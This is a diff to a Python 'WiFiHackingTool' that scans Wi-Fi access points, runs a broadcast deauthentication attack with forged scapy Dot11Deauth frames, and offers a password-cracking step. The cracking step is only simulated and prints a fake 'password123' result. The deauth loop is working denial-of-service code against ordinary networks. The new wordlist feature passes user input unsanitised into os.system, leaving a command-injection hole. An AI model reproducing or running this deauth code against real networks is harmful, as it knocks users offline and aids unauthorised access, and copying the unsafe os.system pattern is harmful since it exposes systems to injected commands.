@@ -19,8 +19,8 @@ class WiFiHackingTool:
         self.wordlists_dir = "wordlists"
         self.wordlists = []
         self.selected_ap = None
-        self.deauth_running = False  # Flag for deauth attack
-
+        self.selected_wordlist = None
+        
         # Create wordlists directory if it doesn't exist
         if not os.path.exists(self.wordlists_dir):
             os.makedirs(self.wordlists_dir)
@@ -52,7 +52,7 @@ class WiFiHackingTool:
                 # Check if we already have this AP
                 existing = next((ap for ap in self.access_points if ap['bssid'] == bssid), None)
                 
-                if not existing and ssid:
+                if not existing:
                     ap_info = {
                         'ssid': ssid,
                         'bssid': bssid,
@@ -60,13 +60,10 @@ class WiFiHackingTool:
                     }
                     self.access_points.append(ap_info)
                     print(f"{Fore.GREEN}[+] Found AP: {ssid} (BSSID: {bssid}, Channel: {channel}){Style.RESET_ALL}")
-
+        
         # Start sniffing
         sniff(iface=self.interface, prn=packet_handler, stop_filter=lambda x: not self.running)
-
-        if not self.access_points:
-            print(f"{Fore.RED}[!] No access points found. Please ensure your wireless interface is in monitor mode and try again.{Style.RESET_ALL}")
-
+    
     def select_interface(self):
         """Let user select a wireless interface"""
         print(f"{Fore.YELLOW}[*] Available wireless interfaces:{Style.RESET_ALL}")
@@ -123,7 +120,7 @@ class WiFiHackingTool:
             try:
                 choice = int(input("\nSelect AP (number): "))
                 if 1 <= choice <= len(self.access_points):
-                    self.selected_ap = self.access_points[choice - 1]
+                    self.selected_ap = self.access_points[choice-1]
                     print(f"{Fore.GREEN}[+] Selected AP: {self.selected_ap['ssid']}{Style.RESET_ALL}")
                     return True
                 else:
@@ -138,28 +135,21 @@ class WiFiHackingTool:
             return
         
         print(f"\n{Fore.RED}[!] Starting deauthentication attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}")
         
         # Set channel to AP's channel
         subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(self.selected_ap['channel'])], check=True)
         
-        self.deauth_running = True  # Set flag to indicate attack is running
-
-        def attack():
-            while self.deauth_running:
-                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.selected_ap['bssid'], addr3=self.selected_ap['bssid']) / Dot11Deauth()
+        # Create deauth packet
+        pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.selected_ap['bssid'], addr3=self.selected_ap['bssid']) / Dot11Deauth()
+        
+        try:
+            while True:
                 sendp(pkt, iface=self.interface, count=10, inter=0.1)
                 time.sleep(1)
-        
-        attack_thread = Thread(target=attack)
-        attack_thread.start()
-
-        # Wait for user to interrupt
-        while self.deauth_running:
-            time.sleep(0.1)
-
-        attack_thread.join()
-        print(f"\n{Fore.GREEN}[+] Deauthentication attack stopped{Style.RESET_ALL}")
-
+        except KeyboardInterrupt:
+            print(f"\n{Fore.GREEN}[+] Deauthentication attack stopped{Style.RESET_ALL}")
+    
     def crack_password(self):
         """Crack WiFi password using wordlist"""
         if not self.selected_ap:
@@ -178,8 +168,8 @@ class WiFiHackingTool:
             try:
                 choice = int(input("\nSelect wordlist (number): "))
                 if 1 <= choice <= len(self.wordlists):
-                    selected_wordlist = self.wordlists[choice - 1]
-                    print(f"{Fore.GREEN}[+] Selected wordlist: {os.path.basename(selected_wordlist)}{Style.RESET_ALL}")
+                    self.selected_wordlist = self.wordlists[choice-1]
+                    print(f"{Fore.GREEN}[+] Selected wordlist: {os.path.basename(self.selected_wordlist)}{Style.RESET_ALL}")
                     break
                 else:
                     print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
@@ -189,25 +179,59 @@ class WiFiHackingTool:
         print(f"\n{Fore.RED}[!] Starting password cracking attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] This may take a long time...{Style.RESET_ALL}")
         
-        # Simulate the process of capturing handshake and cracking
+        # Here you would normally capture handshake first, then crack it
+        # For simplicity, we'll simulate the process
         print(f"{Fore.CYAN}[*] Simulating capture of handshake...{Style.RESET_ALL}")
         time.sleep(3)
-
-        print(f"{Fore.CYAN}[*] Cracking password using {os.path.basename(selected_wordlist)}...{Style.RESET_ALL}")
         
-        # Simulate cracking
+        # Simulate cracking with aircrack-ng
+        print(f"{Fore.CYAN}[*] Cracking password with {os.path.basename(self.selected_wordlist)}...{Style.RESET_ALL}")
+        
+        # In a real implementation, you would use:
+        # subprocess.run(['sudo', 'aircrack-ng', 'capture.cap', '-w', self.selected_wordlist])
+        
+        # Simulate finding password (for demo purposes)
         time.sleep(5)
         print(f"\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
         print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
-
+    
+    def wordlist_management(self):
+        """Manage wordlists"""
+        while True:
+            print(f"\n{Fore.YELLOW}[*] Wordlist Management{Style.RESET_ALL}")
+            print("1. Add new wordlist")
+            print("2. View current wordlists")
+            print("3. Back to main menu")
+            
+            try:
+                choice = int(input("\nSelect option: "))
+                
+                if choice == 1:
+                    path = input("Enter path to wordlist file: ")
+                    if os.path.exists(path):
+                        filename = os.path.basename(path)
+                        dest = os.path.join(self.wordlists_dir, filename)
+                        os.system(f"cp {path} {dest}")
+                        self.load_wordlists()
+                        print(f"{Fore.GREEN}[+] Wordlist added successfully{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
+                elif choice == 2:
+                    print(f"\n{Fore.YELLOW}[*] Current wordlists:{Style.RESET_ALL}")
+                    for wordlist in self.wordlists:
+                        print(f"- {os.path.basename(wordlist)}")
+                elif choice == 3:
+                    break
+                else:
+                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
+            except ValueError:
+                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
+    
     def signal_handler(self, sig, frame):
         """Handle Ctrl+C signal"""
-        if self.deauth_running:
-            self.deauth_running = False  # Set flag to stop deauth attack
-            print(f"\n{Fore.YELLOW}[*] Stopping deauthentication attack...{Style.RESET_ALL}")
-        else:
-            self.running = False  # This will stop the wireless scan
-
+        print(f"\n{Fore.YELLOW}[*] Stopping scan...{Style.RESET_ALL}")
+        self.running = False
+    
     def main_menu(self):
         """Display main menu"""
         while True:
@@ -215,7 +239,8 @@ class WiFiHackingTool:
             print("1. Scan for WiFi networks")
             print("2. Perform deauthentication attack")
             print("3. Crack WiFi password")
-            print("4. Exit")
+            print("4. Manage wordlists")
+            print("5. Exit")
             
             try:
                 choice = int(input("\nSelect option: "))
@@ -233,6 +258,8 @@ class WiFiHackingTool:
                     if self.select_ap():
                         self.crack_password()
                 elif choice == 4:
+                    self.wordlist_management()
+                elif choice == 5:
                     print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                     sys.exit(0)
                 else:
